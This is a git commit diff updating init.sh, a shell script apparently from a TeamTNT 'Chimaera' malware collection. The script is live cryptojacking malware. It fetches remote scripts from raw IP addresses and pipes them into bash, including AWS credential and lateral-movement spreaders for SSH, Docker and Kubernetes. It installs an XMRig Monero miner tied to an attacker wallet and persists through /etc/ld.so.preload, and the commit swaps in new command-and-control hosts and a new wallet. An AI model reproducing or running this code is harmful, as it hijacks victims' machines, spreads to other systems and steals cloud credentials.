1ddfad940588f050a56a098675956b80e0769e12
ToRxmrig <79212597+ToRxmrig@users.noreply.github.com>
2024-09-10 13:26:39 -0500

    Update init.sh

--- TEAMTNT_MASTER_LIST/chimaera/45_9_148_35/45.9.148.35/chimaera/sh/init.sh
+++ TEAMTNT_MASTER_LIST/chimaera/45_9_148_35/45.9.148.35/chimaera/sh/init.sh
@@ -1,6 +1,15 @@
 #!/bin/sh
 
-# wget -O - http://45.9.148.35/chimaera/sh/init.sh | sh
+# wget -O - http://45.145.7.253/chimaera/sh/init.sh | sh 
+# http://45.9.148.85/LevelUp/bin/bots/TNT_AWS.sh
+# http://45.9.148.85/LevelUp/snitch.sh
+#  http://45.145.7.253/chimaera/sh/spread_ssh.sh : done
+# http://45.145.7.253/so/xmrig.so : done
+# borg.wtf/aws.sh 
+# http://45.145.7.253/chimaera/sh/xmr.sh.sh
+# http://45.145.7.253/chimaera/sh/spread_docker_local.sh
+#
+
 
 
 if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi ; if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi ; if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi
@@ -10,18 +19,18 @@ if [ "$(whoami)" = "root" ]; then
 wget -q -O - http://45.9.148.85/LevelUp/bin/bots/TNT_AWS.sh | bash
 wget -O - http://45.9.148.85/LevelUp/snitch.sh | bash
 export HOME=/usr
-curl -sLk https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46EPFzvnX5GH61ejkPpNcRNm8kVjs8oHS9VwCkKRCrJX27XEW2y1NPLfSa54DGHxqnKfzDUVW1jzBfekk3hrCVCmAUrFd3H
+curl -sLk https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
 export HOME=/root
 
-wget http://45.9.148.35/chimaera/so/xmrig.so -O /etc/rig.so && echo "/etc/rig.so" >> /etc/ld.so.preload
+wget http://45.145.7.253/so/xmrig.so -O /etc/rig.so && echo "/etc/rig.so" >> /etc/ld.so.preload
 
-wget -O - http://45.9.148.35/chimaera/sh/kube.lateral.sh | bash &
-if [ -f "/root/.ssh/id_rsa" ]; then wget -O - http://45.9.148.35/chimaera/sh/spread_ssh.sh | bash ; fi
-wget -O - http://45.9.148.35/chimaera/sh/spread_docker_local.sh | bash &
+wget -O - http://45.145.7.253/chimaera/sh/kube.lateral.sh | bash &
+if [ -f "/root/.ssh/id_rsa" ]; then wget -O - http://45.145.7.253/chimaera/sh/spread_ssh.sh | bash ; fi
+wget -O - http://45.145.7.253/chimaera/sh/spread_docker_local.sh | bash &
 
 fi
 
-wget -O - http://45.9.148.35/chimaera/sh/xmr.sh.sh | sh
+wget -O - http://45.145.7.253/chimaera/sh/xmr.sh.sh | sh
 
 wget -O - http://45.9.148.85/LevelUp/snitch.sh | bash || curl http://45.9.148.85/LevelUp/snitch.sh | bash
 rm -f /home/ciuser/.../systemd ; pkill systemd
